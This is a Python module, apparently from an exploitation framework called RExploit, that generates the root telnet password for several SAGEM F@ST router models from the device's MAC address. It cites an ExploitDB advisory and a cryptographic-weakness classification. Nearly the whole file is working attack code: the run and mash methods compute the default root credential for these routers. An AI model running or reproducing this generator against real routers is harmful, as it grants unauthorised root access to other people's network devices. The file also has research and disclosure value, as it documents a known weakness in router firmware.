# coding=utf-8
from lib.interfaces.iexploit import IExploit


class Exploit(IExploit):
    def __init__(self):
        super(Exploit, self).__init__(
            name="F@ST telnet password generator",
            category="generator",
            authors={
                "Vulnerability discovery": "Daniel Diez",
                "RExploit module": "Elouafiq Ali"
            },
            date="21/07/2015",
            cwe="CWE-310: Cryptographic Issues",
            targets=[
                "3304-V1",
                "3304-V2",
                "3464",
                "3504"
            ],
            references={
                "https://www.exploit-db.com/exploits/17670/": "ExploitDB"
            },
            description="Generates root telnet password for various SAGEM FAST routers."
        )

    # It is work of Ján Trenčanský
    def run(self, mac):
        mac = mac.upper()
        mac = mac.replace("-", "")
        mac = mac.replace(":", "")

        password = [c for c in "00000000"]
        mac = [c.lower() for c in mac]

        password[0] = self.mash(mac[5], mac[11])
        password[1] = self.mash(mac[0], mac[2])
        password[2] = self.mash(mac[10], mac[11])
        password[3] = self.mash(mac[0], mac[9])
        password[4] = self.mash(mac[10], mac[6])
        password[5] = self.mash(mac[3], mac[9])
        password[6] = self.mash(mac[1], mac[6])
        password[7] = self.mash(mac[3], mac[4])
        password = "".join(p for p in password)
        return password

    @staticmethod
    def mash(a, b):
        first = min(a, b)
        second = max(a, b)
        if int(second, 16) < 10:
            if int(first, 16) + int(second, 16) <= 9:
                return chr(ord(first) + int(second, 16))
            else:
                return hex(ord(first) + int(second, 16))
        else:
            return chr(ord(second) + int(first, 16))
